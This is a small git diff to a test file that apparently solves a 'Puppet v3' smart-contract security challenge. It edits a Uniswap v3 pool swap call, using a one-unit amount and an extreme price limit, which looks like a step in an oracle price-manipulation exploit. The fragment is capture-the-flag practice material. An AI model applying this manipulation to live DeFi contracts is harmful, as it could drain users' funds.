@@ -177,12 +177,13 @@ describe('[Challenge] Puppet v3', function () {
 
 
         console.log(await attackPool.slot0())
-        return;
+        // return;
+        log(attackPool.address)
         await attackPool.swap(
             attackPuppet.address,
             false,
-            ethers.utils.parseEther("100"),
-            0,
+            1,
+            ethers.BigNumber.from("1461446703485210103287273052203988822378723970342").sub(1),
             [],
             {
                 gasLimit: 1e7
